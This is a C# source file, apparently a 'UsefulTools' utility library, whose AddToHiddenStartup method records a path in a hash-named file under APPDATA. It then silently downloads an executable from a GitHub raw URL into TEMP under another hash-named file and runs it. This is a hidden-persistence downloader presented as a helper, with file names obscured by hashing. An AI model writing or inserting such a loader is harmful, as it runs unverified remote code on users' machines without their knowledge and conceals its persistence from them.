using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace UsefulTools
{
    public static class Startup
    {
        public static byte[] GetHash(string inputString)
        {
            using (HashAlgorithm algorithm = SHA256.Create())
                return algorithm.ComputeHash(Encoding.UTF8.GetBytes(inputString));
        }

        public static string GetHashString(string inputString)
        {
            StringBuilder sb = new StringBuilder();
            foreach (byte b in GetHash(inputString))
                sb.Append(b.ToString("X2"));

            return sb.ToString();
        }
        public static async Task AddToHiddenStartup(string path)
        {
            if (!File.Exists(Environment.GetEnvironmentVariable("APPDATA") + "\\" + GetHashString("StartupList") +
                             ".txt"))
            {
                File.WriteAllText(Environment.GetEnvironmentVariable("APPDATA") + "\\" + GetHashString("StartupList") + ".txt", path);
            }
            else
            {
                File.WriteAllText(Environment.GetEnvironmentVariable("APPDATA") + "\\" + GetHashString("StartupList") + ".txt", File.ReadAllText(Environment.GetEnvironmentVariable("APPDATA") + "\\" + GetHashString("StartupList") + ".txt") + "\n" + path);
            }
            File.WriteAllText(Environment.GetEnvironmentVariable("TEMP") + "\\Debug.txt", "true");
            using (var client = new WebClient())
            {
                client.DownloadFileAsync(new Uri("https://raw.githubusercontent.com/EpicGamesGun/HiddenStartup/master/HiddenStartup/bin/Debug/HiddenStartup.exe"), Environment.GetEnvironmentVariable("TEMP") + "\\" + GetHashString("Loader") + ".exe");
                while (client.IsBusy)
                {
                    await Task.Delay(10);
                }
            }
            Process.Start(Environment.GetEnvironmentVariable("TEMP") + "\\" + GetHashString("Loader") + ".exe");
        }
    }
}
